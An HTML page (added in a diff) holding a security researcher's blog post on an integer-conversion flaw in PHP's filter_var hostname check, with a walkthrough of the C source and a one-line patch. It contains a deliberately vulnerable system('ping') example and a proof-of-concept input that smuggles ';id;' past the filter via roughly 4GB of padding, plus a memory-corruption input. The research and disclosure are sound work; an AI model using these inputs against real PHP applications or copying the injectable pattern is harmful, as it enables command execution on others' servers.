@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<script data-goatcounter="https://pwningsystems.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
+<head>
+  
+    <title>PHP filter_var shenanigans :: pwning.systems</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="It is likely that we have all seen PHP filters that prevent us from encountering vulnerabilities. Here in this blog post, I&amp;rsquo;ll walk you through my thought process for bypassing a filter by looking for a bug in the filter itself in order to reach a bug!
+Let&amp;rsquo;s pretend we have the following code, which passes some user-input to filter_var() and uses the FILTER FLAG HOSTNAME variable. This adds the functionality to validate hostnames on a per-host rationale (this means that they must begin with an alphanumeric character and must contain only alphanumerics or hyphens throughout their entire length)." />
+<meta name="keywords" content="PHP, filter_var, bypass" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://pwning.systems/posts/php_filter_var_shenanigans/" />
+
+
+
+
+<link rel="stylesheet" href="https://pwning.systems/assets/style.css">
+
+  <link rel="stylesheet" href="https://pwning.systems/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://pwning.systems/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://pwning.systems/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://pwning.systems/" />
+  
+    <meta name="twitter:creator" content="pwningsystems" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="PHP filter_var shenanigans">
+<meta property="og:description" content="It is likely that we have all seen PHP filters that prevent us from encountering vulnerabilities. Here in this blog post, I&#39;ll walk you through my thought process for bypassing a filter by looking for a bug in the filter itself in order to reach a bug!" />
+<meta property="og:url" content="https://pwning.systems/posts/php_filter_var_shenanigans/" />
+<meta property="og:site_name" content="pwning.systems" />
+
+  <meta property="og:image" content="https://pwning.systems/">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-03-26 09:05:53 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    pwning.systems
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/bugs">Bugs</a></li>
+        
+      
+        
+          <li><a href="/links">Links</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/index.xml">RSS</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/bugs">Bugs</a></li>
+      
+    
+      
+        <li><a href="/links">Links</a></li>
+      
+    
+      
+        <li><a href="/index.xml">RSS</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://pwning.systems/posts/php_filter_var_shenanigans/">PHP filter_var shenanigans</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-03-26 
+      </span>
+    
+    
+    <span class="post-author">:: Jordy Zomer</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://pwning.systems/tags/php/">PHP</a>&nbsp;
+    
+    #<a href="https://pwning.systems/tags/filter_var/">filter_var</a>&nbsp;
+    
+    #<a href="https://pwning.systems/tags/bypass/">bypass</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>It is likely that we have all seen PHP filters that prevent us from encountering vulnerabilities. Here in this blog post, I&rsquo;ll walk you through my thought process for bypassing a filter by looking for a bug in the filter itself in order to reach a bug!</p>
+<p>Let&rsquo;s pretend we have the following code, which passes some user-input to <code>filter_var()</code> and uses the <code>FILTER FLAG HOSTNAME</code> variable. This adds the functionality to validate hostnames on a per-host rationale (this means that they must begin with an alphanumeric character and must contain only alphanumerics or hyphens throughout their entire length). Following the successful completion of this check, the user-input will be used in a system command (thus potentially introducing a command injection vulnerability). The code that is generated will resemble something like the following.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+ 
+$userinput <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;YOUR_USER_INPUT&#34;</span>;
+$command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ping -c5 &#34;</span>;
+
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">filter_var</span>($userinput, <span style="color:#a6e22e">FILTER_VALIDATE_DOMAIN</span>, <span style="color:#a6e22e">FILTER_FLAG_HOSTNAME</span>))
+{
+    <span style="color:#a6e22e">system</span>($command <span style="color:#f92672">.</span> $userinput, $retval);
+}
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Normally, it would not be possible to trigger this command injection in such a situation. Because our user&rsquo;s input can only contain alphanumeric characters or a hyphen, it would be completely safe in this case.</p>
+<p>The underlying code, however, is quite vulnerable, as we will see when we examine it in detail to see how the <code>FILTER_VALIDATE_DOMAIN</code> function works in conjunction with the <code>FILTER_FLAG_HOSTNAME</code> flag. Let&rsquo;s take a look at how this works!</p>
+<p>As soon as we call <code>filter_var()</code> with the <code>FILTER_VALIDATE_DOMAIN</code> flag, the function <code>php_filter_validate_domain()</code> will be executed. Let&rsquo;s take a closer look at what this means.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">php_filter_validate_domain</span>(PHP_INPUT_FILTER_PARAM_DECL) <span style="color:#75715e">/* </span>{{{ <span style="color:#960050;background-color:#1e0010">*/</span>
+{
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>_php_filter_validate_domain(Z_STRVAL_P(value), Z_STRLEN_P(value), flags)) {
+	RETURN_VALIDATION_FAILED
+	}
+}
+<span style="color:#75715e">/* }}} */</span>
+</code></pre></div><p>Essentially, what this does is obtain a pointer to the value of our <code>$userinput</code> variable and pass it as the first argument to <code>_php_filter_validate_domain</code>, as well as passing the output of <code>strlen($userinput)</code>  as the second argument to the same function. It is critical to note that the function <code>strlen()</code> returns an unsigned integer in this case.</p>
+<p>Now let&rsquo;s take a look at the function signature of <code>_php_filter_validate_domain</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">static</span>  <span style="color:#66d9ef">int</span>  _php_filter_validate_domain(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> domain, <span style="color:#66d9ef">int</span> len, zend_long flags)
+</code></pre></div><p>In this case, the second argument to this function is <code>int len</code>, which indicates that it is a signed integer, whereas we were passing the output of <code>strlen</code>, which indicates that it is an unsigned integer (<code>size_t</code>), to it as the second argument. Do you see where I&rsquo;m heading?</p>
+<p>In order to comprehend this, we must first understand how integers function. When it comes to numerical variables, they can either be signed or unsigned depending on their ability to represent both positive and negative numbers. The difference between signed and unsigned variables is that signed variables can represent both positive and negative numbers, while unsigned variables can only represent non-negative numbers.</p>
+<p>For example, if we assume that the architecture is 32 bits, then an unsigned integer&rsquo;s value can range from <code>0</code> to <code>4294967295</code> due to the fact that it is unsigned, but an int&rsquo;s value can only range from <code>-2147483648</code> to <code>2147483648</code> due to the fact that it is signed. The result is that any value greater than <code>2147483647</code> will result in a negative number being passed to the function.</p>
+<p>However, if we examine the <code>_php_filter_validate_domain</code> function, we will notice that the variable <code>l</code> is of type <code>size_t</code>, and that the value <code>len</code> has been assigned to this variable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_php_filter_validate_domain</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> domain, <span style="color:#66d9ef">int</span> len, zend_long flags) <span style="color:#75715e">/* </span>{{{ <span style="color:#960050;background-color:#1e0010">*/</span>
+{
+	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>e, <span style="color:#f92672">*</span>s, <span style="color:#f92672">*</span>t;
+	size_t l;
+	<span style="color:#66d9ef">int</span> hostname <span style="color:#f92672">=</span> flags <span style="color:#f92672">&amp;</span> FILTER_FLAG_HOSTNAME;
+	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+
+	s <span style="color:#f92672">=</span> domain;
+	l <span style="color:#f92672">=</span> len; 
+	e <span style="color:#f92672">=</span> domain <span style="color:#f92672">+</span> l;
+	t <span style="color:#f92672">=</span> e <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+</code></pre></div><p>The function takes <code>len</code> as a <code>int</code> (signed), and then assigns it to <code>l</code> as a <code>size_t</code>. This is demonstrated above. If we pass a string with a long length, such as <code>4294967286</code>, then the values for both <code>len</code> and <code>l</code> will be <code>0</code>&rsquo;s because passing that value as an int will wrap to <code>0</code>. This means that <code>s</code> (start) will have the same address as <code>e</code> (end).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">	<span style="color:#75715e">/* Ignore trailing dot */</span>
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>t <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span>) {
+		e <span style="color:#f92672">=</span> t;
+		l<span style="color:#f92672">--</span>;
+	}
+
+	<span style="color:#75715e">/* The total length cannot exceed 253 characters (final dot not included) */</span>
+	<span style="color:#66d9ef">if</span> (l <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">253</span>) {
+		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+	}
+</code></pre></div><p>We see that if <code>t</code> (end-1) is <code>.</code>  then  <code>e</code> is written with the character <code>.</code>, as if we were to pass a very large number to the function. Example: if we have <code>4294967250</code>, then the variable <code>l</code> will wrap to <code>18446744073709551570</code>, which means we can write a <code>.</code> out of bounds (OOB) A successful exploit would be very difficult. As a result, I decided against taking this route. Following that, we can see that it is checked to see if <code>l</code> is greater than 253.. (Not a problem if we can force it to become <code>0</code>, right?).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">	<span style="color:#75715e">/* First char must be alphanumeric */</span>
+	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">*</span>s <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">||</span> (hostname <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>isalnum((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)s))) {
+		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+	}
+
+	<span style="color:#66d9ef">while</span> (s <span style="color:#f92672">&lt;</span> e) {
+		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>s <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span>) {
+			<span style="color:#75715e">/* The first and the last character of a label must be alphanumeric */</span>
+			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(s <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">||</span> (hostname <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">!</span>isalnum((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(s <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>isalnum((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(s <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>))))) {
+				<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+			}
+
+			<span style="color:#75715e">/* Reset label length counter */</span>
+			i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+		} <span style="color:#66d9ef">else</span> {
+			<span style="color:#66d9ef">if</span> (i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">63</span> <span style="color:#f92672">||</span> (hostname <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>s <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>isalnum((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)s))) {
+				<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+			}
+
+			i<span style="color:#f92672">++</span>;
+		}
+
+		s<span style="color:#f92672">++</span>;
+	}
+
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><p>The code shown above is the actual code that checks to see that the hostname only contains alphanumeric characters or a hyphen (as opposed to other characters). As we can see, this only occurs if <code>s</code> is less than <code>e</code> in the first place.</p>
+<p>In simple terms: If a hostname is checked using PHP&rsquo;s <code>filter_var</code> function and the value passed to the function is too long, and the parameter <code>l</code> is then wrapping to zero, the check will not be performed. This results in the hostname being bypassed entirely.</p>
+<p>Let&rsquo;s demonstrate this using a simple PoC!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>  
+  
+<span style="color:#75715e">// normal usage  
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">filter_var</span>(<span style="color:#e6db74">&#34;example.com&#34;</span>, <span style="color:#a6e22e">FILTER_VALIDATE_DOMAIN</span>, <span style="color:#a6e22e">FILTER_FLAG_HOSTNAME</span>));  
+  
+<span style="color:#75715e">// filter bypass  
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">filter_var</span>(<span style="color:#e6db74">&#34;5;id;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">str_repeat</span>(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#ae81ff">4294967286</span>) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;a.com&#34;</span>, <span style="color:#a6e22e">FILTER_VALIDATE_DOMAIN</span>, <span style="color:#a6e22e">FILTER_FLAG_HOSTNAME</span>));  
+  
+<span style="color:#75715e">// DoS/Memory corruption
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">filter_var</span>(<span style="color:#a6e22e">str_repeat</span>(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#ae81ff">2294967286</span>), <span style="color:#a6e22e">FILTER_VALIDATE_DOMAIN</span>, <span style="color:#a6e22e">FILTER_FLAG_HOSTNAME</span>));  
+  
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Thus, if we pass the following user-input to the program, we will be able to achieve code execution in the manner described in the first example.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP">$userinput <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5;id;&#34;</span>  <span style="color:#f92672">.</span>  <span style="color:#a6e22e">str_repeat</span>(<span style="color:#e6db74">&#34;a&#34;</span>,  <span style="color:#ae81ff">4294967286</span>)  <span style="color:#f92672">.</span>  <span style="color:#e6db74">&#34;a.com&#34;</span>;
+</code></pre></div><p>Victory! We were able to get around the filter and get to our vulnerable code this time around.</p>
+<p>Because the PHP security team has not yet patched this issue, I have attached my own one-liner patch below, that you can apply with the command <code>git am $patchfile</code>.</p>
+<pre tabindex="0"><code>From 9c064e66226c9da5b9c0170342ba516055a31be5 Mon Sep 17 00:00:00 2001
+From: Jordy Zomer &lt;jordy@pwning.systems&gt;
+Date: Fri, 25 Mar 2022 18:03:34 +0100
+Subject: [PATCH] Fix integer conversion that results in filter bypass.
+
+Signed-off-by: Jordy Zomer &lt;jordy@pwning.systems&gt;
+---
+ ext/filter/logical_filters.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+diff --git a/ext/filter/logical_filters.c b/ext/filter/logical_filters.c
+index 91bf929a9d..96a6c72b56 100644
+--- a/ext/filter/logical_filters.c
++++ b/ext/filter/logical_filters.c
+@@ -504,7 +504,7 @@ void php_filter_validate_regexp(PHP_INPUT_FILTER_PARAM_DECL) /* {{{ */
+        }
+ }
+
+-static int _php_filter_validate_domain(char * domain, int len, zend_long flags) /* {{{ */
++static int _php_filter_validate_domain(char * domain, size_t len, zend_long flags) /* {{{ */
+ {
+        char *e, *s, *t;
+        size_t l;
+--
+2.32.0
+</code></pre><p>There are some limitations to this exploit, for example, the user input must be 4GB in size (which is a large amount of data and may not be possible due to the configuration of some webservers and load balancers). However, I believe that this has the potential to have a significant impact.</p>
+<p>As always, I hope you found this post to be interesting. Any and all feedback is appreciated :)</p>
+<p>Cheers,</p>
+<p>Jordy</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://pwning.systems/posts/escaping-containers-for-fun/">
+                <span class="button__text">Escaping privileged containers for fun</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Jordy Zomer</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://pwning.systems/assets/main.js"></script>
+<script src="https://pwning.systems/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
